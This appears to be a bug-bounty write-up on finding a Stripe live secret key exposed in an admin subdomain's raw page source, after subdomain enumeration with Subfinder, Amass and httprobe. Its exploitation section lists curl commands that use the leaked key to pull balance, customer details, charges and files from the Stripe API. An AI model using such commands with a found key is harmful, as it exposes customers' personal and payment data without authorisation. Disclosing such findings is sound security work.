# [ **Leaking stripe live token ]**

1. He collected all the subdomains using tools like `Subfinder` and `Amass`. After that, he filtered the live subdomains using `httprobe`.
2. Found a subdomain [http://admin.redacted.com](https://t.co/PxDyizfiSQ) which redirects the **user/admin** to google OAuth
    1. Your browser can execute JavaScript, which can, in turn, change the document; in this case, it redirects to **google OAuth.**
3. After this, he used curl for [http://admin.redacted.com](https://t.co/PxDyizfiSQ) to get the plain original output and nothing else.

⇒ **Leaking stripe live token** 

![image](https://user-images.githubusercontent.com/108616378/219940019-ba476ee4-4820-42a4-8d50-a08845dd1a40.png)

### **⇒  [ Exploiting Stripe Tokens ]**

After checking the `Keyhacks` and the `Stripe API Documentation`. I was able to get a bunch of information, including:

```bash
# Balance: It retrieves the current balance in the Stripe account.
curl [https://api.stripe.com/v1/balance](https://t.co/NrdwZz2XOp) -u sk_live_<Secret-Key>:
# Customers: It retrieves the customer’s data and tracks payments. Including the Customer’s Name, Email, IP used, and many more
curl https://api.stripe.com/v1/customers -u sk_live_<Secret-Key>:  
#Charges: It retrieves charges and card information. One such card details are also attached below. Stripe only gives you the last four digits.
curl https://api.stripe.com/v1/charges -u sk_live_<Secret-Key>:
#Files: Retrieves Files that the admin uploads. Files generally have invoices, disputes, events, balances, bank accounts, tokens, charges, and more.
curl https://api.stripe.com/v1/files -u sk_live_<Secret-Key>:
```

![image](https://user-images.githubusercontent.com/108616378/219940030-24b3095a-47cf-4278-b87d-66ef3830bbe7.png)
